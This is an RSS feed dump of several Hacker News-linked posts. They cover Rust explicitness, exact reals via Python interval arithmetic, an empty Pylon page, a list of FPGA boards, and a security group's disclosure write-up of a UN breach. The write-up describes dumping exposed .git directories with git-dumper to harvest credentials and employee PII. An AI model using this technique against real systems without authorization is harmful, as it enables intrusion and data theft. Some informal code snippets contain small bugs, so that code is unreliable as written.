explicit language, but when I use the word explicit, I mean something more
specific than most users seem to mean. To me, <strong>Rust is explicit because you
can figure out a lot about your program from the source of it</strong>.</p>

<p>For example, here’s some Rust structs:</p>

<pre><code>struct Doggo {
    coat_color: Color,
    stamina: u32,
    love: u32,
    // NOTE: always set to true
    is_a_good_dog: bool,
}

struct Color(u8, u8, u8);

struct TennisBall;

struct Park {
   dogs: Vec&lt;Doggo&gt;,
}

struct Fetch&lt;'a&gt; {
    park: &amp;'a Park,
    doggo: &amp;'a Doggo,
    ball: TennisBall,
}
</code></pre>

<p>I can tell a lot of things about how these structs will be laid out in memory
by looking at them:</p>

<ul>
<li>I know what fields any of these structs could have (unlike some dynamic
languages).</li>
<li>I know what sets of values are valid for each field of each of these structs
(that is, I know what type they are).</li>
<li>Except for the vector of Doggos in Park, I know all of this data will be
allocated on the stack.</li>
<li>The TennisBall struct has no fields, so it will be completely compiled away.</li>
<li>I know that the references in <code>Fetch</code> will be pointers to a Park and a Doggo.</li>
<li>I can get a good guess as to the size of each struct, depending on how
alignment will turn out on my target platform.</li>
</ul>

<p>One thing that’s not explicit in this sense of the word is the exact ordering
of the fields in these structs. Rust has intentionally left field ordering
unspecified in order to optimize the layout of structs by reordering their
fields. Usually this doesn’t matter to you, but it does if you are writing
unsafe code.</p>

<p>I think it is often very good to be explicit in the sense about many things.
There’s always a trade off in choosing to ensure that something is explicit
like this (for example, the compiler can’t silently decide to allocate data in
the heap instead of the stack, or vice versa, as an optimization). I’d say that
in this sense, Rust is a explicit about more aspects of your program than most
languages, and this is a great strength.</p>

<p>But this is a very narrow definition of explicitness. All it means is that
given a source code, I can answer cewrtain questions about the program it is
associated with. I want to break up the idea of explicitness into some other,
narrower definitions, and examine how different features do or don’t exhibit
those notions of explicitness.</p>





<p>Sometimes, when syntax is suggested that is lighter weight, I see users suggest
that this is more implicit. But as long as the source code conveys the
information, it is still explicit in the narrow sense I defined above. I would
call this attribute <strong>noisiness</strong>.</p>

<p>An example of this was the introduction of the <code>?</code> operator. This operator was
fewer characters than the previous <code>try!</code> macro. Some users were concerned that
this would make it easy to miss early returns from <code>?</code> in their program. Here,
they were arguing in favor of noisiness: these users felt that it was important
that early return be noisy, not only that it be explicit.</p>

<p>I personally feel that all return points should be explicit, but not
necessarily noisy. That is, if I need to figure out how this function returns,
I should be able to, but its not so important that it be immediately put into
my mind when I glance at the code. Often - especially when forwarding errors,
as <code>?</code> does - the early return is the least important part of the source code
to me.</p>



<p>Sometimes, users argue that syntax should be heavy weight specifically to
discourage performing the operation it controls. Often, this has to do with
performance. For example, users may see it as an advantage that it is much less
pleasant to allocate something on the heap than on the stack.</p>

<p>Often, this argument will be couched in terms of explicitness, but “syntactic
salt” like this is quite orthogonal from explicitness or implicitness. Instead,
its about being <strong>burdensome</strong> for users, to discourage certain behavior. For
example, we could have an attribute like <code>#[repr(boxed)]</code>, which indicates that
this type is always allocated in the heap. This would be a more convenient of
this common pattern:</p>

<pre><code>struct Catters {
    inner: Box&lt;CattersInner&gt;,
}

struct CattersInner {
    color: Color,
    pounces: u32,
    naps: u32,
    meows: u32,
}


// With repr(boxed) this becomes one struct:
#[repr(boxed)]
struct Catters {
    color: Color,
    pounces: u32,
    naps: u32,
    meows: u32,
}
</code></pre>

<p>This would not be less explicit - you can look at the Catters struct and learn
all of the same information about how it is laid out in memory. But it does
make it much less annoying to allocate a type in the heap.</p>

<p>As before, I personally don’t find it helpful for heap allocations to be
burdensome. I struggle to think of a feature in which I want heap allocations to
happen by default, but there are many situations in which a heap allocation is
preferable to a stack allocation, and we shouldn’t make users feel frustrated
or like they’re doing it wrong when they make that choice.</p>

<h2 id="explicit-is-not-manual">Explicit is not Manual</h2>

<p>Sometimes, explicit is used to refer to requiring users to write code to make
something happen. But if the thing will happen deterministically in a manner
that can be derived from the source, it is still explicit in the narrow sense
that I laid out earlier. Instead, this is about saying that certain actions
should be <strong>manual</strong> - users have to opt in to making them happen.</p>

<p>For example, you could imagine a version of Rust that does not run destructors
unless users manually call the <code>drop</code> method. (Setting aside that you <strong>can’t</strong>
call the drop method today - let’s imagine that it takes self by value for this
example). This is actually safe, since Rust does not guarantee that destructors
will run.</p>

<pre><code>fn string_processing(string: String, numbers: &amp;mut Vec&lt;u32&gt;) {
    substrings = string.split_whitespace().filter(|s| s.starts_with('$'));
    for substring in substring {
        let n = substring.parse().unwrap();
        numbers.push(n);
    }
    // Must explicitly call this, or the string will be leaked:
    string.drop();
}
</code></pre>

<p>If you were to delete the call to drop, the memory associated with that string
would just leak. It seems uncontroversial to say that this would be worse. It’s
fine that destructors are called automatically, because users can always figure
out when they will be called by looking at when the value with a destructor
goes out of scope.</p>

<h2 id="explicit-is-not-local">Explicit is not Local</h2>

<p>Sometimes, when users say that something should be explicit, they mean explicit
within a particular section of code. That is, they mean that they should be
able to discern this fact about the code by looking at this particular snippet,
which could be of any size - this module, this function, this expression, etc.
Just because something is explicit in the source code doesn’t mean its explicit
in any given section of the source code - a better word for that is to say it
is <strong>local</strong> to that section of source code.</p>

<p>A feature of Rust that is not implicit, but also not local, is method
resolution. Look at this snippet of code:</p>

<pre><code>fn main() {
    let mut vec = vec![0, 1, 2];
    let x = vec.len();
    vec.extend([x, x + 1]);
    for elem in vec.into_iter() {
	println!("{}", elem)
    }
}
</code></pre>

<p>In this function, we call three different methods on vec - <code>len</code>, <code>extend</code>, and
<code>into_iter</code>. Each take <code>self</code> by in a different way (by reference, by mutable
reference and by value). Two are inherent methods, and one comes from the
<code>Extend</code> trait. None of this information is visible looking at this function
alone, but all of it is explicit if you look at the <code>impl</code> blocks for <code>Vec&lt;T&gt;</code>.</p>

<p>In contrast, the <code>?</code> operation does preserve this kind of locality. You could
imagine a world in which functions that return <code>Result</code> are automatically <code>?</code>d
inside other functions that return <code>Result</code> (this is how throwing exceptions
works in languages like Java). We’ve decided that you should not need to look
at the function signature to determine if a function can make its caller return
early. I think this is an example in which we’ve made the right choice to keep
something local.</p>



<p>So, if you ever find yourself reaching for the word “explicitness” as the crux
of your …</p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://boats.gitlab.io/blog/post/2017-12-27-things-explicit-is-not/">https://boats.gitlab.io/blog/post/2017-12-27-things-explicit-is-not/</a></em></p>]]>
            </description>
            <link>https://boats.gitlab.io/blog/post/2017-12-27-things-explicit-is-not/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25724778</guid>
            <pubDate>Mon, 11 Jan 2021 05:06:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Sketchy Exact Reals from Interval Arithmetic (2021)]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25724673">thread link</a>) | @philzook
<br/>
January 10, 2021 | https://www.philipzucker.com/Reals_from_intervals/ | <a href="https://web.archive.org/web/*/https://www.philipzucker.com/Reals_from_intervals/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div aria-label="Content">
      <div>
        <article itemscope="" itemtype="http://schema.org/BlogPosting">

  

  <div itemprop="articleBody">
    <p>Exact reals are cool.</p>

<p>I’ve got piles of stuff to say, and there are tendrils that lead off in so many directions that I only cloudily understand, but it’s nice to rip off a manageable chunk here.</p>

<p>Any system that allows for arbitrarily accurate calculations of a number can be considered a system of exact reals.</p>

<p>That means the object that represents the “real number” must not be just a pile of dead data like a float. It has to somehow be able to receive instruction about the precision required and then output the desired answer. There are different representation choices for this that may be natural depending on the facilities of your language and tastes.</p>

<p>One that is very natural to me though is to represent such a thing as a function that takes in a precision request and outputs something like a number <code>Precision -&gt; Number</code>. This precision could be an integer specifying the number of digits of precision, and the Number could be a rational (a numerator and denominator) or some kind of arbitrary precision float data type from a library like MPFR, or perhaps an interval of these things.</p>

<p>How is an exact real different from an interval data type? This something I’ve wondered about. They do seem awfully similar. Well, I think I have a way to make an nonperformant exact real library from an interval library with a precision knob.</p>

<p>Here for example is an exact real in python that uses the <a href="https://mpmath.org/">mpmath</a> library for all the heavy lifting. <code>mpmath</code> has an interval type which is controlled by a global variable <code>dps</code> holding digits of precision. By placing the computation of the interval into a thunk, we can compute an answer over and over at increasing precision. Even though you don’t have to explicilty pass it, this global <code>dps</code> parameter can be thought of as a precision parameter to these thunked functions. The result of the thunk at each evaluation depends on it’s current value.</p>

<div><div><pre><code><span>from</span> <span>mpmath</span> <span>import</span> <span>iv</span>
<span>from</span> <span>typing</span> <span>import</span> <span>Callable</span>
<span>import</span> <span>operator</span> <span>as</span> <span>op</span>

<span># type definitions
</span><span>interval</span> <span>=</span> <span>mpmath</span><span>.</span><span>ctx_iv</span><span>.</span><span>ivmpf</span>
<span># thunked intervals that use dps ~ reals
</span><span>real</span> <span>=</span> <span>Callable</span><span>[[],</span> <span>interval</span><span>]</span>


<span># lifts a one argument interval function to a one argument thunked interval function
</span><span>def</span> <span>lift</span><span>(</span><span>f</span> <span>:</span> <span>Callable</span><span>[[</span><span>interval</span><span>],</span> <span>interval</span><span>])</span> <span>-&gt;</span> <span>Callable</span><span>[[</span><span>real</span><span>],</span> <span>real</span><span>]:</span>
    <span>def</span> <span>res</span><span>(</span><span>x</span> <span>:</span> <span>real</span><span>)</span> <span>-&gt;</span> <span>real</span><span>:</span>
        <span>return</span> <span>lambda</span> <span>:</span> <span>f</span><span>(</span><span>x</span><span>())</span>  
    <span>return</span> <span>res</span>

<span># lifts a one argument interval function to a one argument thunked interval function
</span><span>def</span> <span>lift2</span><span>(</span><span>f</span> <span>:</span> <span>Callable</span><span>[[</span><span>interval</span><span>,</span> <span>interval</span><span>],</span> <span>interval</span><span>])</span> <span>-&gt;</span> <span>Callable</span><span>[[</span><span>real</span><span>,</span> <span>real</span><span>],</span> <span>real</span><span>]:</span>
    <span>def</span> <span>res</span><span>(</span><span>x</span> <span>:</span> <span>real</span><span>,</span> <span>y</span><span>:</span> <span>real</span><span>)</span> <span>-&gt;</span> <span>real</span><span>:</span>
        <span>return</span> <span>lambda</span> <span>:</span> <span>f</span><span>(</span><span>x</span><span>(),</span> <span>y</span><span>())</span>  
    <span>return</span> <span>res</span>

<span>def</span> <span>const</span><span>(</span><span>x</span> <span>:</span> <span>str</span><span>)</span> <span>-&gt;</span> <span>real</span><span>:</span>
    <span>return</span> <span>lambda</span> <span>:</span> <span>iv</span><span>.</span><span>mpf</span><span>(</span><span>x</span><span>)</span>

<span># some simple lifts of mpmath functions
</span><span>rsin</span> <span>=</span> <span>lift</span><span>(</span><span>iv</span><span>.</span><span>sin</span><span>)</span>
<span>rcos</span> <span>=</span> <span>lift</span><span>(</span><span>iv</span><span>.</span><span>cos</span><span>)</span>
<span>rexp</span> <span>=</span> <span>lift</span><span>(</span><span>iv</span><span>.</span><span>exp</span><span>)</span>
<span>rlog</span> <span>=</span> <span>lift</span><span>(</span><span>iv</span><span>.</span><span>log</span><span>)</span>
<span>rneg</span> <span>=</span> <span>lift</span><span>(</span><span>op</span><span>.</span><span>neg</span><span>)</span>
<span>radd</span> <span>=</span> <span>lift2</span><span>(</span><span>op</span><span>.</span><span>add</span><span>)</span>
<span>rmul</span> <span>=</span> <span>lift2</span><span>(</span><span>op</span><span>.</span><span>mul</span><span>)</span>


<span># a random example calculation
</span><span>third</span> <span>=</span> <span>const</span><span>(</span><span>"1/3"</span><span>)</span>
<span>v</span> <span>=</span> <span>rmul</span><span>(</span> <span>rexp</span><span>(</span> <span>third</span><span>)</span> <span>,</span> <span>rlog</span><span>(</span><span>third</span><span>))</span>

<span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>10</span><span>):</span>
    <span>iv</span><span>.</span><span>dps</span> <span>=</span> <span>i</span>
    <span>print</span><span>(</span><span>v</span><span>())</span>
<span>'''
[-2.0, -1.0]
[-1.5625, -1.48438]
[-1.537109, -1.529297]
[-1.5339355, -1.5327148]
[-1.53326416, -1.53320313]
[-1.533239365, -1.533231735]
[-1.5332376957, -1.5332362652]
[-1.53323698044, -1.53323693573]
[-1.533236963674, -1.533236958086]
[-1.5332369611133, -1.5332369599491]
'''</span>
</code></pre></div></div>

<p>If you want nice python operator overloading, it wouldn’t be so difficult to wrap this thunk in a simple <code>Real</code> or <code>Refinable</code> wrapper class.</p>

<p>A different representation that might feel more natural is a stream of increasingly better answers. These two representations are basically equivalent. I can create a stream (a python generator in this case) from the function by applying it to a stream of precisions and a function from a stream by getting the nth element of the stream.</p>

<div><div><pre><code><span>def</span> <span>streamify</span><span>(</span><span>f</span> <span>:</span> <span>Callable</span><span>[[</span><span>precision</span><span>],</span><span>number</span><span>])</span> <span>-&gt;</span> <span>Iterator</span><span>[</span><span>number</span><span>]</span>
    <span>def</span> <span>res</span><span>():</span>
        <span>n</span> <span>=</span> <span>0</span>
        <span>while</span> <span>True</span><span>:</span>
            <span>n</span> <span>+=</span> <span>1</span>
            <span>yield</span> <span>f</span><span>(</span><span>n</span><span>)</span>
    <span>return</span> <span>res</span>

<span>def</span> <span>funcify</span><span>(</span><span>s</span> <span>:</span> <span>Iterator</span><span>[</span><span>number</span><span>])</span> <span>-&gt;</span> <span>Callable</span><span>[[</span><span>precision</span><span>],</span><span>number</span><span>]):</span>
    <span>def</span> <span>res</span><span>(</span><span>n</span><span>):</span>
        <span>return</span> <span>s</span><span>()[</span><span>n</span><span>]</span>
    <span>return</span> <span>res</span>
</code></pre></div></div>

<p>The only functions that play nice with a notion of arbitrarily refinable calculation are continuous functions. If you have a discontinuity, then an arbitrarily small width interval input can create a finite width interval in the output, which breaks the contract of what the real is supposed to do. It is no longer an arbitrarily refinable number and the shell game we’re playing where we pretend the intervals somehow are converging to a number go out the window.</p>

<h3 id="predicates-and-belnap-bools">Predicates and Belnap Bools</h3>

<p>So that’s all cool, but what really gets me going is to start considering predicates on the real numbers and boolean operations. One representation of a decidable predicate for a computer’s purposes is a function that takes in the object and gives you a boolean of the property holds on the object or not.</p>

<p>But here is an example that calls for a richer notion of truth than just booleans.</p>

<p>Extending what you accept as a notion of truth is very similar to extending what you consider a notion of number.
The only actual numbers are the counting numbers. I do kind of believe that notions of truth = {true, false} is a fairly natural notion, more natural in some sense than others.  And yet, one can develop intuition and comfort with the truly bizarre concept of a complex number $a + ib$ and treat it the same or analogous to counting numbers for a restricted set of algebraic manipulations.
And these other notions of truth obey similar algebraic manipulations or notions of proof, typically just more restricted in some way. Doing quantum mechanics with the naturals would suck (if possible).</p>

<p>The <code>mpmath</code> library when you ask questions about intervals like <code>i1 &lt; i2</code> operates under a three-valued logic. If the question is definitely true for every element in the intervals, it output <code>True</code>, definitely false it outputs <code>False</code>, but if there is overlap of the intervals it outputs <code>None</code> representing a “I’m not sure”.</p>

<p>So intervals behave under a kind of <a href="https://en.wikipedia.org/wiki/Three-valued_logic">three-valued logic</a>. There actually is a default value <code>missing</code> in <a href="https://docs.julialang.org/en/v1/manual/missing/">Julia</a> that behaves in this way, and it is also not an unknown conept in the context of databases with missing entries. This three-valued logic I’m going to call the Belnap booleans (I think this may be slightly inaccurate. The Belnap booleans are a four valued logic. )</p>

<p>For our use case, the <code>None</code> means “you need to refine the precision more to find out”.</p>

<p>The refinables add an extra layer on this. The truth value used by predicates over exact reals is not a boolean, not is it even the three-valued logic of intervals. Instead it is a refinable three-valued logic.</p>

<p>The dependence of the interval on the precision is monotonic. If we increase the precision, the new interval must be a subset of the interval at less precision in order for everything to bve behaving consistently.  Similarly, these truth values can only increase in information. In some sense <code>None</code> represents a value of less information than the value <code>True</code> or <code>False</code>. As the computation gets refined the information content should only go up.</p>

<p>Through an accident of the short circuiting mechanism and falsity of <code>None</code> in python, the standard operations <code>and</code> and <code>or</code> are close to what we want for the Belnap booleans</p>

<div><div><pre><code><span>x</span> <span>=</span> <span>[</span><span>True</span><span>,</span> <span>False</span><span>,</span> <span>None</span><span>]</span>
<span>for</span> <span>i</span> <span>in</span> <span>x</span><span>:</span>
    <span>for</span> <span>j</span> <span>in</span> <span>x</span><span>:</span>
        <span>print</span><span>(</span> <span>f"</span><span>{</span><span>i</span><span>}</span><span> or </span><span>{</span><span>j</span><span>}</span><span> = </span><span>{</span><span>i</span> <span>or</span> <span>j</span><span>}</span><span>"</span> <span>)</span>
<span>'''
True or True = True
True or False = True
True or None = True
False or True = True
False or False = False
False or None = None
None or True = True
None or False = False
None or None = None
'''</span>

<span>for</span> <span>i</span> <span>in</span> <span>x</span><span>:</span>
    <span>for</span> <span>j</span> <span>in</span> <span>x</span><span>:</span>
        <span>print</span><span>(</span> <span>f"</span><span>{</span><span>i</span><span>}</span><span> and </span><span>{</span><span>j</span><span>}</span><span> = </span><span>{</span><span>i</span> <span>and</span> <span>j</span><span>}</span><span>"</span> <span>)</span>
<span>'''
True and True = True
True and False = False
True and None = None
False and True = False
False and False = False
False and None = False
None and True = None
None and False = None
None and None = None
'''</span>

</code></pre></div></div>

<p>The one case that doesn’t work is <code>(None,False)</code> in both cases. For <code>belor</code> we want <code>belor(None,False) = None</code> because it is not yet known what the truth value is. If the <code>None</code> refines to <code>True</code> it should be <code>True</code> but if <code>None</code> refines to <code>False</code> it should be <code>False</code>. Similarly we want <code>beland(None,False) = False</code> since we already know that regardless of the refinement value of <code>None</code>, the already known <code>False</code> kills it.
So we can just catch these two cases and fix them.</p>

<div><div><pre><code><span>belnap</span> <span>=</span> <span>Optional</span><span>[</span><span>bool</span><span>]</span>

<span>def</span> <span>belor</span><span>(</span><span>x</span> <span>:</span> <span>belnap</span><span>,</span> <span>y</span> <span>:</span> <span>belnap</span><span>)</span> <span>-&gt;</span> <span>belnap</span><span>:</span>
    <span>if</span> <span>x</span> <span>==</span> <span>None</span> <span>and</span> <span>y</span> <span>==</span> <span>False</span><span>:</span>
        <span>return</span> <span>None</span>
    <span>return</span> <span>x</span> <span>or</span> <span>y</span>

<span>def</span> <span>beland</span><span>(</span><span>x</span> <span>:</span> <span>belnap</span><span>,</span> <span>y</span> <span>:</span> <span>belnap</span><span>)</span> <span>-&gt;</span> <span>belnap</span><span>:</span>
    <span>if</span> <span>x</span> <span>==</span> <span>None</span> <span>and</span> <span>y</span> <span>==</span> <span>False</span><span>:</span>
        <span>return</span> <span>False</span>
    <span>return</span> <span>x</span> <span>and</span> <span>y</span>

<span>def</span> <span>belnot</span><span>(</span><span>x</span> <span>:</span> <span>belnap</span><span>)</span> <span>-&gt;</span> <span>belnap</span><span>:</span>
    <span>if</span> <span>x</span> <span>==</span> <span>None</span><span>:</span>
        <span>return</span> <span>None</span>
    <span>return</span> <span>not</span> <span>x</span>

</code></pre></div></div>

<p>These belnap operations can be lifted to refinable belnaps. The prefix “r” stands for “refinable”. As the precision is increased, we can turn from unsure <code>None</code> values to certain <code>True/False</code> values.</p>

<div><div><pre><code><span>rbelnap</span> <span>=</span> <span>Callable</span><span>[[],</span> <span>belnap</span><span>]</span>

<span># no actually. We actually need truth tables.
</span><span>rnot</span> <span>=</span> <span>lift</span><span>(</span><span>belnot</span><span>)</span>
<span>ror</span> <span>=</span> <span>lift2</span><span>(</span><span>belor</span><span>)</span>
<span>rand</span> <span>=</span> <span>lift</span><span>(</span><span>beland</span><span>)</span>

<span># lifts a one argument interval function to a one argument thunked interval function
</span><span>def</span> <span>lift2</span><span>(</span><span>f</span> <span>:</span> <span>Callable</span><span>[[</span><span>interval</span><span>,</span> <span>interval</span><span>],</span> <span>Optional</span><span>[</span><span>bool</span><span>]])</span> <span>-&gt;</span> <span>Callable</span><span>[[</span><span>real</span><span>,</span> <span>real</span><span>],</span> <span>belnap</span><span>]:</span>
    <span>def</span> <span>res</span><span>(</span><span>x</span> <span>:</span> <span>real</span><span>,</span> <span>y</span><span>:</span> <span>real</span><span>)</span> <span>-&gt;</span> <span>belnap</span><span>:</span>
        <span>return</span> <span>lambda</span> <span>:</span> <span>f</span><span>(</span><span>x</span><span>(),</span> <span>y</span><span>())</span>  
    <span>return</span> <span>res</span>


<span>rlt</span> <span>=</span> <span>lift2</span><span>(</span><span>op</span><span>.</span><span>lt</span><span>)</span>
<span>rgt</span> <span>=</span> <span>lift2</span><span>(</span><span>op</span><span>.</span><span>gt</span><span>)</span>
<span>rne</span> <span>=</span> <span>lift2</span><span>(</span><span>op</span><span>.</span><span>ne</span><span>)</span>

<span># equality total poison. Do not use these. Uh... Wait. No just as good as inequality.
</span><span>req</span> <span>=</span> <span>lift2</span><span>(</span><span>op</span><span>.</span><span>eq</span><span>)</span>
<span>rge</span> <span>=</span> <span>lift2</span><span>(</span><span>op</span><span>.</span><span>ge</span><span>)</span>
<span>rle</span> <span>=</span> <span>lift2</span><span>(</span><span>op</span><span>.</span><span>le</span><span>)</span>

<span>third</span> <span>=</span> <span>const</span><span>(</span><span>"1/3"</span><span>)</span>
<span>thirdish</span> <span>=</span> <span>const</span><span>(</span><span>"0.3333"</span><span>)</span>
<span>v</span> <span>=</span> <span>rgt</span><span>(</span><span>third</span><span>,</span> <span>thirdish</span><span>)</span>
<span>for</span> <span>i</span> <span>in</span> <span>range</span><span>(</span><span>10</span><span>):</span>
    <span>iv</span><span>.</span><span>dps</span> <span>=</span> <span>i</span>
    <span>print</span><span>(</span><span>f"Precision </span><span>{</span><span>i</span><span>}</span><span>: </span><span>{</span><span>v</span><span>()</span><span>}</span><span>"</span><span>)</span>
<span>'''
Precision 0: None
Precision 1: None
Precision 2: None
Precision 3: None
Precision 4: True
Precision 5: True
Precision 6: True
Precision 7: True
Precision 8: True
Precision 9: True
'''</span>
</code></pre></div></div>

<h3 id="quantifiers">Quantifiers</h3>

<p>This section is a little sketchy.</p>

<p>We can actually implement semidecision procedures for predicates represented as block box predicates.
Basically, the reals are searchable by making …</p></div></article></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.philipzucker.com/Reals_from_intervals/">https://www.philipzucker.com/Reals_from_intervals/</a></em></p>]]>
            </description>
            <link>https://www.philipzucker.com/Reals_from_intervals/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25724673</guid>
            <pubDate>Mon, 11 Jan 2021 04:51:14 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Pylon – Your new favorite discussion platform]]>
            </title>
            <description>
<![CDATA[
Score 5 | Comments 5 (<a href="https://news.ycombinator.com/item?id=25724076">thread link</a>) | @hastes
<br/>
January 10, 2021 | https://pylon.gg/p/27dec919-16e9-46d7-b245-28b565ad3bf9 | <a href="https://web.archive.org/web/*/https://pylon.gg/p/27dec919-16e9-46d7-b245-28b565ad3bf9">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-v-405e5d70=""><p>
                Greetings, traveler
            </p> <p>
                Staying a while? Registered users can customize their
                profile, create Shards, and join the discussion.
            </p> </div></div>]]>
            </description>
            <link>https://pylon.gg/p/27dec919-16e9-46d7-b245-28b565ad3bf9</link>
            <guid isPermaLink="false">hacker-news-small-sites-25724076</guid>
            <pubDate>Mon, 11 Jan 2021 03:32:29 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[UNEP Breached, 100K+ Employee Records Accessed]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 1 (<a href="https://news.ycombinator.com/item?id=25724030">thread link</a>) | @latchkey
<br/>
January 10, 2021 | https://johnjhacking.com/blog/unep-breach/ | <a href="https://web.archive.org/web/*/https://johnjhacking.com/blog/unep-breach/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><p>A writeup detailing the exposed employee records that Sakura Samurai managed to access during our security research through their vulnerability disclosure program.</p><p>Reading time: 3 minutes.</p><div>
      

<p>We noticed that The United Nations had a Vulnerability Disclosure Program and a Hall of Fame, therefore Sakura Samurai 桜の侍 our security research group, set out to look for vulnerabilities to report to the United Nations. During the research process Jackson Henry @JacksonHHax , Nick Sahler, John Jackson @johnjhacking and Aubrey Cottle @Kirtaner identified an endpoint that exposed Git Credentials. The credentials gave us the ability to download the Git Repositories, identifying a ton of user credentials and PII. In total, we identified over 100K+ private employee records. We also discovered multiple exposed .git directories on UN owned web servers [ilo.org], the .git contents could then be exfiltrated with various tools such as “git-dumper”.</p>

<p><strong>Travel Records [Two Documents: 102,000+ Records]</strong></p>
<p><img src="https://johnjhacking.com/uploads/travel-records.png" alt=""><br>
Travel Records Included Employee ID Numbers, Names, Employee Groups, Travel Justification, Start and End Dates, Length of Stay, Approval Status, Destination and the Length of the stay.</p>
<p><strong>HR Nationality Demographics [Two Documents: 7,000+ Records]</strong></p>
<p><img src="https://johnjhacking.com/uploads/nationality-records.png" alt=""><br>
Included Employee Name, Employee Group, Employee ID Numbers, Person’s Nationality, Person’s Gender, Employee Pay Grade, Organization Work Unit Identification Number and Organization Unit Text Tags.</p>
<p><strong>Generalized Employee Records [One document: 1,000+ Records]</strong></p>
<p><img src="https://johnjhacking.com/uploads/hr-records.png" alt=""><br>
Index Numbers, Employee Names, Employee Emails, Employee Work Subareas and Employee Org Units. Note: The column with the “Red number 1” represent the Employee’s specific work department and was blurred as some of the sub-units are smaller.</p>
<p><strong>Project and Funding Source Records [One Document: 4,000+ Records]</strong></p>
<p><img src="https://johnjhacking.com/uploads/project-funding.png" alt=""><br>
Included Project Identification Number, Affected Areas, Grant and Co-financing amounts, Implementing Agencies, Countries, Funding Sources, Period of the Project and if the Project/Concept was approved.</p>
<p><strong>Evaluation Reports [One Document: 283 Projects]</strong></p>
<p><img src="https://johnjhacking.com/uploads/eval-reports.png" alt=""><br>
Overall descriptions of the Evaluations and Reports, Periods Conducted and a link to the report on the project.</p>

<p>In addition, on the lesser side of severity, we managed to takeover a SQL Database and a Survey Management Platform belonging to the International Labour Organization - also in the UN’s VDP program scope. However, it was of note that the ILO vulnerabilities were of little prominence as the Database and Survey Management platform were fairly abandoned in nature and contained hardly anything of use. Nonetheless, a Database takeover and admin account takeover on a platform are still Critical vulnerabilities.</p>
<p>We had performed subdomain enumeration of all of the domains in scope for the VDP offered by the UN. During our research, we began to fuzz multiple endpoints with tooling and initially discovered that an ilo.org subdomain had an exposed .git contents. Utilizing git-dumper [<a href="https://github.com/arthaud/git-dumper" title="https://github.com/arthaud/git-dumper"><strong>https://github.com/arthaud/git-dumper</strong></a>] we were able to dump the project folders hosted on the web application, resulting in the takeover of a MySQL database and of  survey management platform due to exposed credentials within the code.</p>
<p><strong>MySQL Credentials</strong></p>
<p><strong><img src="https://johnjhacking.com/uploads/sql.png" alt=""><br>
Note:</strong> <em>We will not provide a picture of the survey platform due to the specific nature of the application.</em></p>
<hr>
<p>After we had taken over one of the International Labour Organization’s MySQL Databases and performed account takeover on the survey management platform, we began to enumerate other domains/subdomains.</p>
<p>Eventually, we found a subdomain on the United Nations Environment Programme that allowed us to discover github credentials after a bit of fuzzing.</p>
<p><img src="https://johnjhacking.com/uploads/git.png" alt=""><br>
Ultimately, once we discovered the GitHub credentials, we were able to download a lot of private password-protected GitHub projects and within the projects we found multiple sets of database and application credentials for the UNEP production environment. In total, we found <strong>7 additional credential-pairs</strong> which could have resulted in unauthorized access of multiple databases. We decided to stop and report this vulnerability once we were able to access PII that was exposed via Database backups that were in the private projects.</p>
<hr>
<p><strong>Check out our website</strong><br>
<a href="https://sakurasamurai.org/" title="Sakura Samurai">https://sakurasamurai.org</a></p>
<p><strong><em>Twitter Links:</em></strong><br>
Main Page<br>
<a href="https://twitter.com/SakuraSamuraii" title="https://twitter.com/SakuraSamuraii">https://twitter.com/SakuraSamuraii</a><br>
Founders<br>
<a href="https://twitter.com/johnjhacking" title="https://twitter.com/johnjhacking">https://twitter.com/johnjhacking</a><br>
<a href="https://twitter.com/nicksahler" title="https://twitter.com/nicksahler">https://twitter.com/nicksahler</a><br>
Members<br>
<a href="https://twitter.com/JacksonHHax" title="https://twitter.com/JacksonHHax">https://twitter.com/JacksonHHax</a><br>
<a href="https://twitter.com/Kirtaner" title="https://twitter.com/Kirtaner">https://twitter.com/Kirtaner</a><br>
<a href="https://twitter.com/rej_ex" title="https://twitter.com/rej_ex">https://twitter.com/rej_ex</a><br>
<a href="https://twitter.com/endingwithali" title="https://twitter.com/endingwithali">https://twitter.com/endingwithali</a></p>

    </div></div>]]>
            </description>
            <link>https://johnjhacking.com/blog/unep-breach/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25724030</guid>
            <pubDate>Mon, 11 Jan 2021 03:27:54 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Cheap FPGA Development Boards]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25723893">thread link</a>) | @neurotech1
<br/>
January 10, 2021 | https://www.joelw.id.au/FPGA/CheapFPGADevelopmentBoards | <a href="https://web.archive.org/web/*/https://www.joelw.id.au/FPGA/CheapFPGADevelopmentBoards">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="wikitext">

<p>I bought Avnet's $49 Spartan 3A development board but it was discontinued not long afterward - right about the time when I decided I needed a few dozen more. I've since done some extensive research (thanks, Google!) to find a comparable thrifty thrill.
</p>
<p>When choosing a development board, consider what you get with it and what you want to use it for. FPGAs are ideal for use with high speed peripherals, and in general it is much easier to buy a board that contains the part you want, rather than trying to add one on later (and inevitably giving up and upgrading to a more capable board). Examples of things you might want, and are quite difficult to add yourself:
</p>
<ul><li>Gigabit Ethernet
</li><li>HDMI/DVI
</li><li>PCI/PCI Express
</li><li>External non-serial memory (DDR/Flash etc.)
</li></ul><p>Things that are relatively easy to add, and are not so much of a big deal to wire up yourself.
</p>
<ul><li>MMC/SD cards
</li><li>Character (e.g. 16x2) LCDs
</li><li>Anything I2C/SPI and relatively low speed
</li><li>VGA (with low colour depth)
